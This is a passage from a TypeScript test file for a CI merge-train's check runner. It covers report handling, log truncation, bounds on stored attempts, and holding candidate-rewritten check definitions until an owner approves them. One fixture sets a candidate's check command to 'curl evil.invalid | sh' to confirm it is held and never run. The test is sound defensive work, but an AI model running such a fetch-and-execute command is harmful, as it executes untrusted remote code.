      const log = `${char}${"x".repeat(MAX_CHECK_LOG_BYTES - 1)}`;

      await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "fail",
        log,
        finishedAt: NOW,
      });

      const state = harness.attempts.get(ATTEMPT)?.state;
      if (state?.kind !== "reported") throw new Error("not reported");
      expect(state.log).toBe("x".repeat(MAX_CHECK_LOG_BYTES - 1));
      expect(harness.world.reports[0]?.logDigest).toBe(await sha256Hex(encoder.encode(state.log)));
    });
  });

  it("accepts a duplicate of the recorded report and refuses one with another result", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const report = {
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "fail" as const,
        log: "1 failed",
        finishedAt: NOW,
      };
      await harness.checks.report(report);

      expect((await harness.checks.report(report)).ok).toBe(true);
      expect(await harness.checks.report({ ...report, result: "pass" })).toEqual(
        fail("check_mismatch", "This attempt already has another result."),
      );
      expect(harness.world.reports.map((sent) => sent.result)).toEqual(["fail", "fail"]);
      expect(harness.attempts.get(ATTEMPT)?.state).toEqual(
        expect.objectContaining({ kind: "reported", result: "fail" }),
      );
    });
  });

  it("refuses a stale callback naming another candidate, definition or attempt", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const report = {
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "pass" as const,
        log: "",
        finishedAt: NOW,
      };
      const mismatch = fail(
        "check_mismatch",
        "No run of that attempt was started on that candidate.",
      );

      expect(await harness.checks.report({ ...report, candidate: OTHER })).toEqual(mismatch);
      expect(await harness.checks.report({ ...report, digest: "e".repeat(64) })).toEqual(mismatch);
      expect(
        await harness.checks.report({ ...report, attemptId: `chk_${"b".repeat(32)}` }),
      ).toEqual(mismatch);
      expect(harness.world.reports).toEqual([]);
      expect(harness.world.releases).toEqual([]);
      expect(harness.attempts.get(ATTEMPT)?.state.kind).toBe("started");
    });
  });

  it("refuses a report for a held attempt, which never ran", async () => {
    await withChecks(async ({ checks, repository, world }) => {
      repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText({ command: "true" }),
      });
      await checks.start(await attempt());

      const result = await checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest: (await attempt()).definition.digest,
        result: "pass",
        log: "",
        finishedAt: NOW,
      });

      expect(result.ok).toBe(false);
      expect(world.reports).toEqual([]);
    });
  });

  it("returns the train's refusal and still frees the slot", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      harness.world.recorded = fail(
        "check_mismatch",
        "This attempt expired before its report arrived.",
      );

      const result = await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "pass",
        log: "",
        finishedAt: NOW,
      });

      expect(result).toEqual(harness.world.recorded);
      expect(harness.world.releases).toEqual([ATTEMPT]);
    });
  });

  it("refuses a malformed report without touching anything", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const base = { attemptId: ATTEMPT, candidate: CANDIDATE, digest, log: "", finishedAt: NOW };

      expect((await harness.checks.report({ ...base, result: "pass", finishedAt: -1 })).ok).toBe(
        false,
      );
      expect(
        (await harness.checks.report({ ...base, result: "maybe" as "pass", candidate: CANDIDATE }))
          .ok,
      ).toBe(false);
      expect(harness.world.reports).toEqual([]);
    });
  });
});

describe("checks.detail", () => {
  it("shows a started run, then its reported failure, with the command main's definition gave it", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);

      expect(await harness.checks.detail(ATTEMPT)).toEqual(
        ok({
          checkRunId: ATTEMPT,
          candidate: CANDIDATE,
          expectedMain: MAIN,
          definitionDigest: digest,
          command: COMMAND,
          state: { kind: "started", deadline: harness.world.created[0]?.params.slot.deadline },
        }),
      );

      await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "fail",
        log: "1 failed",
        finishedAt: NOW + 5,
      });

      expect(await harness.checks.detail(ATTEMPT)).toEqual(
        ok(
          expect.objectContaining({
            command: COMMAND,
            state: {
              kind: "reported",
              result: "fail",
              finishedAt: NOW + 5,
              logTail: "1 failed",
              logCut: false,
            },
          }),
        ),
      );
    });
  });

  it("shows a held run with the paths it edited and main's command, never the candidate's", async () => {
    await withChecks(async ({ checks, repository }) => {
      repository.commit(CANDIDATE, {
        [CHECK_DEFINITION_PATH]: definitionText({ command: "curl evil.invalid | sh" }),
        "acceptance/a.test.ts": "expect(413)",
      });
      await checks.start(await attempt());

      const detail = await checks.detail(ATTEMPT);

      expect(detail).toEqual(
        ok(
          expect.objectContaining({
            command: COMMAND,
            state: { kind: "held", paths: [CHECK_DEFINITION_PATH] },
          }),
        ),
      );
    });
  });

  it("returns only the end of a long log and says so, and all of one at the bound", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const report = {
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "fail" as const,
        log: `${"x".repeat(MAX_CHECK_DETAIL_LOG_BYTES)}tail`,
        finishedAt: NOW,
      };
      await harness.checks.report(report);

      const detail = await harness.checks.detail(ATTEMPT);
      if (!detail.ok || detail.value.state.kind !== "reported") throw new Error("not reported");
      expect(encoder.encode(detail.value.state.logTail).byteLength).toBe(
        MAX_CHECK_DETAIL_LOG_BYTES,
      );
      expect(detail.value.state.logTail.endsWith("tail")).toBe(true);
      expect(detail.value.state.logCut).toBe(true);
      // The stored output is longer: only the answer is cut.
      const stored = harness.attempts.get(ATTEMPT)?.state;
      expect(stored?.kind === "reported" && stored.log).toBe(report.log);
    });

    await withChecks(async (harness) => {
      const digest = await started(harness);
      const log = "y".repeat(MAX_CHECK_DETAIL_LOG_BYTES);
      await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "pass",
        log,
        finishedAt: NOW,
      });

      const detail = await harness.checks.detail(ATTEMPT);
      if (!detail.ok || detail.value.state.kind !== "reported") throw new Error("not reported");
      expect(detail.value.state.logTail).toBe(log);
      expect(detail.value.state.logCut).toBe(false);
    });
  });

  it("refuses a malformed id and an attempt it never recorded, reading nothing else", async () => {
    await withChecks(async ({ checks, world }) => {
      expect(await checks.detail("not-a-run")).toEqual(
        fail("invalid_request", "Not a check run id."),
      );
      expect(await checks.detail(ATTEMPT)).toEqual(
        fail("not_found", "No record of that check run is kept."),
      );
      expect(world.admissions).toEqual([]);
      expect(world.created).toEqual([]);
    });
  });

  it("reports no command for an attempt stored before commands were kept", async () => {
    await withChecks(async (harness) => {
      await started(harness);
      // A row written under the first schema step has no command.
      harness.sql.exec("UPDATE check_attempts SET command = NULL");

      const detail = await harness.checks.detail(ATTEMPT);

      expect(detail.ok && detail.value.command).toBeNull();
    });
  });

  it("fails as unavailable while the checks module is missing", async () => {
    expect(await unavailableChecks.detail(ATTEMPT)).toEqual(
      fail("unavailable", "The checks module is not available."),
    );
  });
});

/** The identity of the `i`th attempt on the candidate. */
function identity(i: number) {
  return {
    attemptId: `chk_${String(i).padStart(8, "0")}`,
    candidate: CANDIDATE,
    expectedMain: MAIN,
    digest: "d".repeat(64),
  };
}

/** How many of the given IDs the attempt table still holds. */
function rowCount(attempts: AttemptTable, ids: readonly string[]): number {
  return ids.filter((id) => attempts.get(id) !== null).length;
}

describe("the attempt table", () => {
  it("keeps at most its bound, dropping the oldest settled attempts and never a live started one", async () => {
    await withChecks(async ({ attempts }) => {
      // A run whose sandbox deadline is still ahead may yet report.
      attempts.start(identity(0), COMMAND, SANDBOX, NOW, 0);
      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1)
        attempts.hold(identity(i), COMMAND, ["a"], null, i);

      expect(attempts.get(identity(0).attemptId)?.state.kind).toBe("started");
      expect(attempts.get(identity(1).attemptId)).toBeNull();
      expect(attempts.get(identity(MAX_STORED_ATTEMPTS).attemptId)?.state.kind).toBe("held");
    });
  });

  it("keeps a held attempt while the train may still run it, then drops it like a settled one", async () => {
    await withChecks(async ({ attempts, world }) => {
      const ids: string[] = [];
      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1) {
        attempts.hold(identity(i), COMMAND, ["a"], null, i);
        ids.push(identity(i).attemptId);
      }
      world.heldByTrain.add(identity(1).attemptId);

      // The oldest attempt is the train's: the next oldest goes instead, and the bound holds.
      attempts.hold(
        identity(MAX_STORED_ATTEMPTS + 1),
        COMMAND,
        ["a"],
        null,
        MAX_STORED_ATTEMPTS + 1,
      );
      expect(attempts.get(identity(1).attemptId)?.state.kind).toBe("held");
      expect(attempts.get(identity(2).attemptId)).toBeNull();
      ids.push(identity(MAX_STORED_ATTEMPTS + 1).attemptId);
      expect(rowCount(attempts, ids)).toBe(MAX_STORED_ATTEMPTS);

      // Once the train no longer holds it, it is the oldest settled attempt again.
      world.heldByTrain.clear();
      attempts.hold(
        identity(MAX_STORED_ATTEMPTS + 2),
        COMMAND,
        ["a"],
        null,
        MAX_STORED_ATTEMPTS + 2,
      );
      expect(attempts.get(identity(1).attemptId)).toBeNull();
      expect(attempts.get(identity(3).attemptId)?.state.kind).toBe("held");
    });
  });

  it("bounds abandoned runs: a started attempt past its report window is dropped like a settled one", async () => {
    await withChecks(async ({ attempts }) => {
      const ids: string[] = [];
      // More abandoned runs than the bound, each recorded long after the one before it ended.
      for (let i = 0; i < MAX_STORED_ATTEMPTS + 8; i += 1) {
        const now = NOW + i * 2 * REPORT_GRACE_MS;
        attempts.start(identity(i), COMMAND, SANDBOX, now, now);
        ids.push(identity(i).attemptId);
      }

      expect(rowCount(attempts, ids)).toBe(MAX_STORED_ATTEMPTS);
      expect(attempts.get(identity(0).attemptId)).toBeNull();
    });
  });

  it("keeps a started attempt until its report window has passed", async () => {
    await withChecks(async ({ attempts }) => {
      attempts.start(identity(0), COMMAND, SANDBOX, NOW, NOW);
      for (let i = 1; i < MAX_STORED_ATTEMPTS; i += 1)
        attempts.hold(identity(i), COMMAND, ["a"], null, NOW + i);

      // At one millisecond before the window closes, a held attempt goes instead.
      attempts.hold(identity(MAX_STORED_ATTEMPTS), COMMAND, ["a"], null, NOW + REPORT_GRACE_MS - 1);
      expect(attempts.get(identity(0).attemptId)?.state.kind).toBe("started");
      expect(attempts.get(identity(1).attemptId)).toBeNull();

      // Once it has closed, the abandoned run is the oldest settled attempt.
      attempts.hold(identity(MAX_STORED_ATTEMPTS + 1), COMMAND, ["a"], null, NOW + REPORT_GRACE_MS);
      expect(attempts.get(identity(0).attemptId)).toBeNull();
    });
  });

  it("refuses a late report for an abandoned run it dropped, without reaching the train", async () => {
    await withChecks(async (harness) => {
      const digest = await started(harness);
      const late = NOW + 2 * REPORT_GRACE_MS;
      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1)
        harness.attempts.hold(identity(i), COMMAND, ["a"], null, late);

      const result = await harness.checks.report({
        attemptId: ATTEMPT,
        candidate: CANDIDATE,
        digest,
        result: "pass",
        log: "",
        finishedAt: late,
      });

      expect(harness.attempts.get(ATTEMPT)).toBeNull();
      expect(result).toEqual(
        fail("check_mismatch", "No run of that attempt was started on that candidate."),
      );
      expect(harness.world.reports).toEqual([]);
    });
  });
});

/** A CI context whose one runner resolves or rejects as `outcome` says, recording its options. */
function ciContext(outcome: () => Promise<CiRunnerResult>): {
  ci: CiContext;
  seen: RunnerOptions[];
} {
  const seen: RunnerOptions[] = [];
  const ci: CiContext = {
    runner: async (options) => {
      seen.push(options);
      return outcome();
    },
  };
  return { ci, seen };
}

describe("runCheck", () => {
  const params = {
    repoId: `rep_${"9".repeat(64)}`,
    attemptId: ATTEMPT,
    candidate: CANDIDATE,
    digest: "d".repeat(64),
    command: "pnpm test",
    timeoutMs: 600_000,
    namespace: "railhead",
    artifactsRepo: MAIN_REPO,
    slot: { sandbox: SANDBOX, deadline: NOW },
  } satisfies CheckRunParams;

  it("runs the definition's command once, with no step retry", async () => {
    const { ci, seen } = ciContext(async () => ({
      exitCode: 0,
      logs: { stdout: "ok", stderr: "" },
      runner: () => Promise.reject(new Error("no chained runner")),
    }));

    expect(await runCheck(ci, params)).toEqual({
      result: "pass",
      log: "=== stdout ===\nok\n=== stderr ===\n",
    });
    expect(seen).toEqual([
      {
        name: CHECK_RUNNER,
        command: "pnpm test",
        config: {
          retries: { limit: 0, delay: 1_000 },
          timeout: 600_000 + RUN_OVERHEAD_MS,
          commandTimeoutMs: 600_000,
        },
      },
    ]);
  });

  it("reports anything that is not a runner failure as an error with a fixed message", async () => {
    const { ci } = ciContext(async () => {
      throw new Error("token=secret in the message");
    });

    expect(await runCheck(ci, params)).toEqual({
      result: "error",
      log: "Railhead could not run the check.",
    });
  });
});

/**
 * A repository with one started attempt, as `checks.start` leaves it, the train's batch waiting for
 * that attempt's report, and the run parameters the Workflow receives for it.
 */
async function startedRepository(): Promise<{
  stub: DurableObjectStub<Repo>;
  params: CheckRunParams;
}> {
  const { stub, repoId } = await initializedRepository();
  const attemptId = `chk_${crypto.randomUUID().replaceAll("-", "")}`;
  const digest = "d".repeat(64);
  await runInDurableObject(stub, async (_instance, state) => {
    const now = Date.now();
    new AttemptTable(state.storage, () => false).start(
      { attemptId, candidate: CANDIDATE, expectedMain: MAIN, digest },
      COMMAND,
      SANDBOX,
      now + 60_000,
      now,
    );
    waitingBatch(state.storage.sql, attemptId, digest, now);
  });
  return {
    stub,
    params: {
      repoId,
      attemptId,
      candidate: CANDIDATE,
      digest,
      command: "pnpm test",
      timeoutMs: 600_000,
      namespace: "railhead",
      artifactsRepo: MAIN_REPO,
      slot: { sandbox: SANDBOX, deadline: Date.now() + 60_000 },
    },
  };
}

/** A fresh, initialized repository. */
async function initializedRepository(): Promise<{ stub: DurableObjectStub<Repo>; repoId: string }> {
  const name = `r${crypto.randomUUID().replaceAll("-", "").slice(0, 20)}`;
  const stub = env.REPO.getByName(repoObjectName("acme", name));
  const summary = await stub.initialize("acme", name);
  if (!summary.ok) throw new Error(summary.code);
  return { stub, repoId: summary.value.repoId };
}

/** The train's batch waiting for `attemptId`'s report, as its `startCheck` leaves it. */
function waitingBatch(sql: SqlStorage, attemptId: string, digest: string, now: number): void {
  const batchId = insertBatch(
    sql,
    {
      expectedMain: MAIN,
      pins: [{ claimId: "clm_pinned01", generation: 1, commit: OTHER, episode: 1 }],
      decisions: [],
      definition: { name: "test", source: MAIN, digest, acceptance: null },
    },
    now,
  );
  recordCandidate(sql, batchId, CANDIDATE, attemptId, now);
  requestCheck(sql, batchId, now + CHECK_DEADLINE_MS, now);
  markCheckStarted(sql, batchId, now);
}

/** The results the train recorded for `attemptId` on the candidate, from `stub`'s event log. */
async function trainResults(stub: DurableObjectStub<Repo>, attemptId: string): Promise<string[]> {
  const page = await stub.readEvents(0, 100, null);
  if (!page.ok) throw new Error(page.code);
  return page.value.events.flatMap((event) =>
    event.type === "train.check" &&
    event.data.checkRunId === attemptId &&
    event.data.candidate === CANDIDATE
      ? [event.data.result]
      : [],
  );
}

/** The attempt's stored state in `stub`'s repository. */
async function storedState(stub: DurableObjectStub<Repo>, attemptId: string) {
  return runInDurableObject(
    stub,
    async (_instance, state) => new AttemptTable(state.storage, () => false).get(attemptId)?.state,
  );
}

describe("a check run at the real Workflows step boundary", () => {
  it("delivers a pass from the report step to the train, which records it", async () => {
    const { stub, params } = await startedRepository();
    await using instance = await introspectWorkflowInstance(env.CHECKS, params.attemptId);
    await instance.modify(async (m) => {
      await m.mockStepResult(
        { name: CHECK_RUNNER },
        { exitCode: 0, logs: { stdout: "12 passed", stderr: "" } },
      );
    });

    await env.CHECKS.create({ id: params.attemptId, params });
    await instance.waitForStatus("complete");

    expect(await instance.waitForStepResult({ name: REPORT_STEP })).toEqual({ refused: null });
    expect(await trainResults(stub, params.attemptId)).toEqual(["pass"]);
    expect(await storedState(stub, params.attemptId)).toEqual(
      expect.objectContaining({
        kind: "reported",
        result: "pass",
        log: "=== stdout ===\n12 passed\n=== stderr ===\n",
      }),
    );
  });

  it("records the command's own failure as fail, and never retries it into a pass", async () => {
    const { stub, params } = await startedRepository();
    await using instance = await introspectWorkflowInstance(env.CHECKS, params.attemptId);
    await instance.modify(async (m) => {
      // One failure, then a pass a retry would see: the run must stop at the failure.
      await m.mockStepError(
        { name: CHECK_RUNNER },
        new Error(
          `${CHECK_RUNNER} failed with exit code 1\n=== stdout ===\n1 failed\n=== stderr ===\n`,
        ),
        1,
      );
      await m.mockStepResult(
        { name: CHECK_RUNNER },
        { exitCode: 0, logs: { stdout: "", stderr: "" } },
      );
    });

    await env.CHECKS.create({ id: params.attemptId, params });
    await instance.waitForStatus("complete");

    expect(await storedState(stub, params.attemptId)).toEqual(
      expect.objectContaining({ kind: "reported", result: "fail" }),
    );
    expect(await trainResults(stub, params.attemptId)).toEqual(["fail"]);
  });

  it("records a checkout failure as error, not as the change's failure", async () => {
    const { stub, params } = await startedRepository();
    await using instance = await introspectWorkflowInstance(env.CHECKS, params.attemptId);
    await instance.modify(async (m) => {
      await m.mockStepError(
        { name: CHECK_RUNNER },
        new Error("source checkout exited with status 128"),
      );
    });

    await env.CHECKS.create({ id: params.attemptId, params });
    await instance.waitForStatus("complete");

    expect(await storedState(stub, params.attemptId)).toEqual(
      expect.objectContaining({
        kind: "reported",
        result: "error",
        log: "The candidate could not be checked out; the check did not run.",
      }),
    );
    expect(await trainResults(stub, params.attemptId)).toEqual(["error"]);
  });

  it("fails without running anything for parameters the checks module never writes", async () => {
    const { stub, params } = await startedRepository();
    const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
    await using instance = await introspectWorkflowInstance(env.CHECKS, params.attemptId);

    await env.CHECKS.create({ id: params.attemptId, params: { ...params, candidate: "main" } });
    await instance.waitForStatus("errored");

    expect(await storedState(stub, params.attemptId)).toEqual(
      expect.objectContaining({ kind: "started" }),
    );
    expect(await trainResults(stub, params.attemptId)).toEqual([]);
    consoleError.mockRestore();
  });
});

describe("the checks module as the Repo composes it", () => {
  it("starts one run through its entry, and a repeat after a lost create answer starts no other", async () => {
    const { stub, repoId } = await initializedRepository();
    const attemptId = `chk_${crypto.randomUUID().replaceAll("-", "")}`;
    const repository = new FakeRepository();
    const text = definitionText();
    repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: text });
    repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: text, "src/app.ts": "candidate" });
    const check = await parseTrustedCheck(encoder.encode(text), MAIN);
    if (check === null) throw new Error("invalid fixture");

    // Artifacts serves the fake repository under whatever name the entry derives.
    const opened: string[] = [];
    const artifacts = {
      get: async (name: string) => {
        opened.push(name);
        return {
          readFile: async ({ ref, path }: { ref: string; path: string }) => {
            const bytes = await repository.readFile(ref, path, MAX_DEFINITION_BYTES);
            return bytes === null ? null : new Blob([bytes]);
          },
          readCommit: async (hash: string) => {
            const treeHash = await repository.rootTree(hash);
            return treeHash === null ? null : { treeHash };
          },
          readTree: (hash: string) => repository.readTree(hash),
          [Symbol.dispose]: () => {},
        };
      },
    };
    // Each sandbox the admission starts, through the sandbox module's real driver.
    const starts: { name: string; deadline: number }[] = [];
    const sandboxes = {
      idFromName: (name: string) => name,
      get: (name: string) => ({
        railheadStart: async (_policy: unknown, deadline: number) => {
          starts.push({ name, deadline });
        },
        railheadRetire: async () => {},
      }),
    };
    // The first create reaches Workflows, but its answer is lost.
    let creates = 0;
    const checks = {
      createBatch: async (batch: WorkflowInstanceCreateOptions[]) => {
        creates += 1;
        const created = await env.CHECKS.createBatch(batch);
        if (creates === 1) throw new Error("the answer was lost");
        return created;
      },
    };
    const configured: Env = { ...env, CLOUDFLARE_ACCOUNT_ID: "0".repeat(32) };
    Reflect.set(configured, "ARTIFACTS", artifacts);
    Reflect.set(configured, "SANDBOX", sandboxes);
    Reflect.set(configured, "CHECKS", checks);

    await using instance = await introspectWorkflowInstance(env.CHECKS, attemptId);
    await instance.modify(async (m) => {
      await m.mockStepResult(
        { name: CHECK_RUNNER },
        { exitCode: 0, logs: { stdout: "12 passed", stderr: "" } },
      );
    });
    const attemptFor = (definition: CheckAttempt["definition"]): CheckAttempt => ({
      attemptId,
      expectedMain: MAIN,
      candidate: CANDIDATE,
      pins: [],
      definition,
      decisions: [],
      createdAt: Date.now(),
    });
    const results = await runInDurableObject(stub, async (_instance, state) => {
      waitingBatch(state.storage.sql, attemptId, check.definition.digest, Date.now());
      const ports = composeRepo({
        repoId,
        storage: state.storage,
        log: EventLog.open(state.storage, repoId),
        clock: Date.now,
        env: configured,
        wake: async () => true,
      });
      const definitions = await ports.checks.definitions(MAIN);
      const first = await ports.checks.start(attemptFor(check.definition));
      const second = await ports.checks.start(attemptFor(check.definition));
      return { definitions, first, second };
    });

    expect(results.definitions).toEqual(ok([check.definition]));
    expect(results.first).toEqual(
      fail("unavailable", "The check run could not be started; ask again."),
    );
    expect(results.second).toEqual(ok({ attemptId }));
    // One slot admitted and started; the repeat asked Workflows again, which ran one instance.
    expect(starts).toHaveLength(1);
    expect(starts[0]?.name).toMatch(/^sbx-[0-9a-f]{32}$/);
    expect(creates).toBe(2);
    expect(new Set(opened).size).toBe(1);
    await instance.waitForStatus("complete");
    expect(await instance.waitForStepResult({ name: REPORT_STEP })).toEqual({ refused: null });
    expect(await trainResults(stub, attemptId)).toEqual(["pass"]);
  });

  it("refuses to start anything while the Worker has no account configured", async () => {
    const { stub, repoId } = await initializedRepository();
    const result = await runInDurableObject(stub, async (_instance, state) => {
      const ports = composeRepo({
        repoId,
        storage: state.storage,
        log: EventLog.open(state.storage, repoId),
        clock: Date.now,
        env,
        wake: async () => true,
      });
      return ports.checks.start(await attempt());
    });

    expect(result).toEqual(fail("unavailable", "Checks have no Artifacts repository."));
  });
});

/**
 * A Worker environment configured for checks over `repository`: Artifacts objects served from it,
 * and recording sandbox and Workflow bindings that start nothing.
 */
function heldEnvironment(repository: FakeRepository): {
  configured: Env;
  starts: string[];
  creates: string[];
} {
  const starts: string[] = [];
  const creates: string[] = [];
  const configured: Env = { ...env, CLOUDFLARE_ACCOUNT_ID: "0".repeat(32) };
  Reflect.set(configured, "ARTIFACTS", {
    get: async () => ({
      readFile: async ({ ref, path }: { ref: string; path: string }) => {
        const bytes = await repository.readFile(ref, path, MAX_DEFINITION_BYTES);
        return bytes === null ? null : new Blob([bytes]);
      },
      readCommit: async (hash: string) => {
        const treeHash = await repository.rootTree(hash);
        return treeHash === null ? null : { treeHash };
      },
      readTree: (hash: string) => repository.readTree(hash),
      [Symbol.dispose]: () => {},
    }),
  });
  Reflect.set(configured, "SANDBOX", {
    idFromName: (name: string) => name,
    get: (name: string) => ({
      railheadStart: async () => {
        starts.push(name);
      },
      railheadRetire: async () => {},
    }),
  });
  Reflect.set(configured, "CHECKS", {
    createBatch: async (batch: { id?: string }[]) => {
      for (const { id } of batch) creates.push(id ?? "");
      return [];
    },
  });
  return { configured, starts, creates };
}

describe("a held check through the train", () => {
  it("blocks without backoff until the deadline, then parks the lone pin without counting a retry", async () => {
    const { stub, repoId } = await initializedRepository();
    const repository = new FakeRepository();
    repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: definitionText() });
    // The candidate rewrites its own check: it must wait for a person.
    repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: definitionText({ command: "true" }) });
    const { configured, starts, creates } = heldEnvironment(repository);
    const pin = { claimId: "clm_heldpin01", generation: 1, commit: OTHER };

    const seen = await runInDurableObject(stub, async (_instance, state) => {
      let now = NOW;
      const wakes: number[] = [];
      const context: RepoContext = {
        repoId,
        storage: state.storage,
        log: EventLog.open(state.storage, repoId),
        clock: () => now,
        env: configured,
        wake: async (at) => {
          wakes.push(at);
          return true;
        },
      };
      const composed = composeRepo(context);
      const ports = (): RepoPorts => ({
        ...composed,
        claims: {
          ...composed.claims,
          pin: async () => ok(pin),
          currentGeneration: () => pin.generation,
          readyPin: () => ({ pin, episode: 1, decisions: [] }),
        },
        decisions: {
          ...composed.decisions,
          requirements: async () => ok([]),
          currentVersions: () => [],
        },
        mainWriter: { ...composed.mainWriter, head: async () => ok(MAIN) },
        merge: {
          compose: async () => ok({ kind: "clean", candidate: CANDIDATE }),
          discard: async () => ok({ removed: 1 }),
        },
      });
      const train = queueing(createTrain(context, ports), context.log);

      await train.enqueue(pin, 1);
      const first = train.batches(1)[0];
      const blockedOutcome = await train.drive();
      const wakeWhileHeld = wakes.at(-1);
      const reads = repository.reads;
      // A later drive before the deadline asks the checks module nothing.
      const again = await train.drive();
      const readsAgain = repository.reads;

      now = (first?.checkDeadline ?? NOW) + 1;
      await train.drive();
      return {
        first,
        blockedOutcome,
        again,
        wakeWhileHeld,
        reads,
        readsAgain,
        batches: train.batches(3),
        entry: train.entries(1)[0],
        held: new AttemptTable(state.storage, () => false).get(first?.attemptId ?? "")?.state,
      };
    });

    expect(seen.first?.checkHeld).toBe(true);
    expect(seen.blockedOutcome).toEqual({
      kind: "blocked",
      batchId: seen.first?.batchId,
      reason: "check_held",
      code: "check_held",
    });
    expect(seen.again).toEqual(seen.blockedOutcome);
    // No backoff: the only wake asked for while held is the attempt's deadline.
    expect(seen.wakeWhileHeld).toBe(seen.first?.checkDeadline);
    expect(seen.readsAgain).toBe(seen.reads);
    expect(seen.held).toEqual({
      kind: "held",
      paths: [CHECK_DEFINITION_PATH],
      digest: await digestOf(definitionText({ command: "true" })),
    });
    // Past the deadline the held batch fails as held. The pin, held alone, is parked out of the
    // queue with its pin kept: no new batch holds it again, no retry is counted, nothing is dropped.
    expect(seen.batches.map((batch) => [batch.state, batch.failure])).toEqual([
      ["failed", "check_held"],
    ]);
    expect(seen.entry).toEqual(
      expect.objectContaining({ pin, state: "parked", retries: 0, reason: "check_held" }),
    );
    // Nothing ran: no sandbox admitted and started, no Workflow created.
    expect(starts).toEqual([]);
    expect(creates).toEqual([]);
  });
  it.each([
    { hold: "parked", fill: false },
    { hold: "parked", fill: true },
    { hold: "active", fill: true },
  ] as const)(
    "runs a $hold pin's candidate definition once the owner approves it, on the same attempt (table filled: $fill)",
    async ({ hold, fill }) => {
      const { stub, repoId } = await initializedRepository();
      const repository = new FakeRepository();
      repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: definitionText() });
      const rewritten = definitionText({ command: "true" });
      repository.commit(CANDIDATE, { [CHECK_DEFINITION_PATH]: rewritten });
      const { configured, starts } = heldEnvironment(repository);
      const pin = { claimId: "clm_heldpin01", generation: 1, commit: OTHER };
      const digest = await digestOf(rewritten);

      const seen = await runInDurableObject(stub, async (_instance, state) => {
        let now = NOW;
        const log = EventLog.open(state.storage, repoId);
        const context: RepoContext = {
          repoId,
          storage: state.storage,
          log,
          clock: () => now,
          env: configured,
          wake: async () => true,
        };
        const composed = composeRepo(context);
        const created: CheckRunParams[] = [];
        const attempts = new AttemptTable(state.storage, (attemptId) =>
          ports().train.holds(attemptId),
        );
        const checks = createChecks({
          repoId,
          attempts,
          log,
          main: async () => ({
            name: MAIN_REPO,
            namespace: "railhead",
            host: HOST,
            reader: repository,
          }),
          runs: { create: async (_id, params) => void created.push(params) },
          clock: () => now,
          ports: () => ports(),
        });
        let composes = 0;
        const ports = (): RepoPorts => ({
          ...composed,
          claims: {
            ...composed.claims,
            pin: async () => ok(pin),
            currentGeneration: () => pin.generation,
            readyPin: () => ({ pin, episode: 1, decisions: [] }),
          },
          decisions: {
            ...composed.decisions,
            requirements: async () => ok([]),
            currentVersions: () => [],
          },
          mainWriter: { ...composed.mainWriter, head: async () => ok(MAIN) },
          merge: {
            compose: async () => {
              composes += 1;
              return ok({ kind: "clean", candidate: CANDIDATE });
            },
            discard: async () => ok({ removed: 0 }),
          },
          checks,
          train,
        });
        const train = queueing(createTrain(context, ports), log);

        await train.enqueue(pin, 1);
        const held = train.batches(1)[0];
        if (hold === "parked") {
          now = (held?.checkDeadline ?? NOW) + 1;
          await train.drive();
        }
        const waiting = train.entries(1)[0]?.state;
        const heldId = held?.attemptId ?? "";
        // More attempts than the table keeps, all recorded after the held one.
        if (fill) {
          for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1) {
            attempts.hold(identity(i), COMMAND, ["a"], null, now + i);
          }
        }
        const kept = attempts.get(heldId)?.state.kind;
        const oldestFiller = attempts.get(identity(1).attemptId);
        const grant: GrantFor<"check.approve"> = {
          ...approval(digest),
          repoId,
          action: {
            kind: "check.approve",
            checkRunId: held?.attemptId ?? "",
            candidate: CANDIDATE,
            digest,
          },
        };
        const approved = await checks.approve(grant);
        return {
          held,
          waiting,
          kept,
          oldestFiller,
          approved,
          composes,
          created,
          batch: train.batches(1)[0],
          entry: train.entries(1)[0]?.state,
          events: log.replay(0, 100).events.map((event) => event.type),
        };
      });

      expect(seen.waiting).toBe(hold === "parked" ? "parked" : "batched");
      // The table kept the held attempt the train may still run, and dropped an older filler instead.
      expect(seen.kept).toBe("held");
      if (fill) expect(seen.oldestFiller).toBeNull();
      expect(seen.approved).toEqual(ok({ checkRunId: seen.held?.attemptId }));
      // The batch came back on its own candidate and attempt; nothing was composed again.
      expect(seen.composes).toBe(1);
      expect(seen.batch).toMatchObject({
        batchId: seen.held?.batchId,
        state: "checking",
        attemptId: seen.held?.attemptId,
        candidate: CANDIDATE,
        checkStarted: true,
      });
      expect(seen.entry).toBe("batched");
      // It runs the approved command, under the attempt's identity on main's definition.
      expect(
        seen.created.map((params) => [params.attemptId, params.command, params.digest]),
      ).toEqual([[seen.held?.attemptId, "true", seen.held?.definition.digest]]);
      expect(starts).toHaveLength(1);
      expect(seen.events).toEqual(["train.held", "check.approved"]);
    },
  );

  it("refuses an approval once a newer generation superseded the parked pin, changing nothing", async () => {
    const { stub, repoId } = await initializedRepository();
    const repository = new FakeRepository();
    repository.commit(MAIN, { [CHECK_DEFINITION_PATH]: definitionText() });
    const rewritten = definitionText({ command: "true" });
